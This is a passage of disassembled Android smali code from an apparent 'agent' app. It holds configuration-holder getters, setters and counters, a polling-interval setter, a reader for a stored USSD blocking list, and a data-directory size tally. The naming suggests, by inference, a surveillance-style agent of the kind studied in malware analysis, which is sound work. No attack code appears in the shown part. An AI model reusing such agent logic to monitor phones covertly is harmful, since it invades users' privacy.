    invoke-static {p0}, Lcom/network/android/h;->c(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object p0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public static h()V
    .locals 4

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->i:Ljava/lang/Long;

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/network/b/b;->h:J

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->R:Z

    return-void
.end method

.method public static h(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->af:I

    return-void
.end method

.method private static h(Landroid/content/Context;)[Ljava/lang/String;
    .locals 7

    const/4 v0, 0x0

    const/4 v1, 0x0

    :try_start_0
    const-string v2, "getUssdBlockingList"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v2, Lcom/network/b/b;->am:[Ljava/lang/String;

    if-nez v2, :cond_0

    const-string v2, "usTemplated"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "readPreferenceList started preferenceName: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    if-nez v2, :cond_1

    move-object v0, v1

    :goto_0
    sput-object v0, Lcom/network/b/b;->am:[Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_1
    sget-object v0, Lcom/network/b/b;->am:[Ljava/lang/String;

    return-object v0

    :cond_1
    :try_start_1
    invoke-interface {v2}, Landroid/content/SharedPreferences;->getAll()Ljava/util/Map;

    move-result-object v4

    if-eqz v4, :cond_2

    invoke-interface {v4}, Ljava/util/Map;->size()I

    move-result v2

    if-nez v2, :cond_3

    :cond_2
    move-object v0, v1

    goto :goto_0

    :cond_3
    invoke-interface {v4}, Ljava/util/Map;->keySet()Ljava/util/Set;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/Set;->size()I

    move-result v2

    new-array v2, v2, [Ljava/lang/String;

    invoke-interface {v4}, Ljava/util/Map;->keySet()Ljava/util/Set;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v5

    move v3, v0

    :goto_2
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-interface {v4, v0}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    aput-object v0, v2, v3

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v6, " - readPreferenceList Read: "

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    aget-object v6, v2, v3

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto :goto_2

    :cond_4
    const-string v0, "readPreferenceList ended"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    array-length v0, v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    if-nez v0, :cond_5

    move-object v0, v1

    goto :goto_0

    :cond_5
    move-object v0, v2

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "getUssdBlockingList: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1
.end method

.method public static i()J
    .locals 2

    sget-object v0, Lcom/network/b/b;->i:Ljava/lang/Long;

    if-nez v0, :cond_0

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->d(Landroid/content/Context;)V

    :cond_0
    sget-object v0, Lcom/network/b/b;->i:Ljava/lang/Long;

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v0

    return-wide v0
.end method

.method private static i(Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    if-nez p0, :cond_0

    const/4 p0, 0x0

    :goto_0
    return-object p0

    :cond_0
    :try_start_0
    invoke-static {p0}, Lcom/network/android/h;->b(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object p0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public static i(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->ag:I

    return-void
.end method

.method public static j()J
    .locals 2

    sget-wide v0, Lcom/network/b/b;->H:J

    return-wide v0
.end method

.method public static j(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->ah:I

    return-void
.end method

.method public static k()V
    .locals 4

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    sput-wide v0, Lcom/network/b/b;->H:J

    return-void
.end method

.method public static k(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->ab:I

    return-void
.end method

.method public static l()J
    .locals 2

    sget-wide v0, Lcom/network/b/b;->I:J

    return-wide v0
.end method

.method public static l(I)V
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "ConfigurationHolder PollingManager setPollingInterval: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->al:Ljava/lang/Integer;

    return-void
.end method

.method public static m()V
    .locals 4

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    sput-wide v0, Lcom/network/b/b;->I:J

    return-void
.end method

.method public static n()I
    .locals 1

    sget v0, Lcom/network/b/b;->J:I

    return v0
.end method

.method public static o()V
    .locals 1

    sget v0, Lcom/network/b/b;->J:I

    add-int/lit8 v0, v0, 0x1

    sput v0, Lcom/network/b/b;->J:I

    return-void
.end method

.method public static p()V
    .locals 4

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    sput-wide v0, Lcom/network/b/b;->Q:J

    return-void
.end method

.method public static q()J
    .locals 2

    sget-wide v0, Lcom/network/b/b;->Q:J

    return-wide v0
.end method

.method public static r()I
    .locals 1

    sget v0, Lcom/network/b/b;->K:I

    return v0
.end method

.method public static s()V
    .locals 1

    sget v0, Lcom/network/b/b;->K:I

    add-int/lit8 v0, v0, 0x1

    sput v0, Lcom/network/b/b;->K:I

    return-void
.end method

.method public static t()I
    .locals 1

    sget v0, Lcom/network/b/b;->L:I

    return v0
.end method

.method public static u()V
    .locals 1

    sget v0, Lcom/network/b/b;->L:I

    add-int/lit8 v0, v0, 0x1

    sput v0, Lcom/network/b/b;->L:I

    return-void
.end method

.method public static v()J
    .locals 2

    sget-wide v0, Lcom/network/b/b;->S:J

    return-wide v0
.end method

.method public static w()J
    .locals 2

    sget-wide v0, Lcom/network/b/b;->T:J

    return-wide v0
.end method

.method public static x()J
    .locals 2

    sget-wide v0, Lcom/network/b/b;->U:J

    return-wide v0
.end method

.method public static y()I
    .locals 1

    sget v0, Lcom/network/b/b;->Y:I

    return v0
.end method

.method public static z()J
    .locals 7

    const-wide/16 v0, 0x0

    :try_start_0
    const-string v2, "getDataSize"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v2, Ljava/io/File;

    sget-object v3, Lcom/network/b/b;->a:Ljava/lang/String;

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    :cond_0
    :goto_0
    return-wide v0

    :cond_1
    invoke-virtual {v2}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v3

    array-length v3, v3
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_2

    if-eqz v3, :cond_0

    :try_start_1
    invoke-virtual {v2}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v3

    array-length v4, v3

    const/4 v2, 0x0

    :goto_1
    if-ge v2, v4, :cond_2

    aget-object v5, v3, v2
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    :try_start_2
    invoke-virtual {v5}, Ljava/io/File;->length()J
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0

    move-result-wide v5

    add-long/2addr v0, v5

    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :catch_0
    move-exception v5

    :try_start_3
    const-string v6, "getDataSize "

    invoke-static {v6, v5}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_2

    :catch_1
    move-exception v2

    :try_start_4
    const-string v3, "getDataSize "

    invoke-static {v3, v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_2

    :cond_2
    :goto_3
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "getDataSize: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_0

    :catch_2
    move-exception v2

    const-string v3, "getDataSize "

    invoke-static {v3, v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_3
.end method
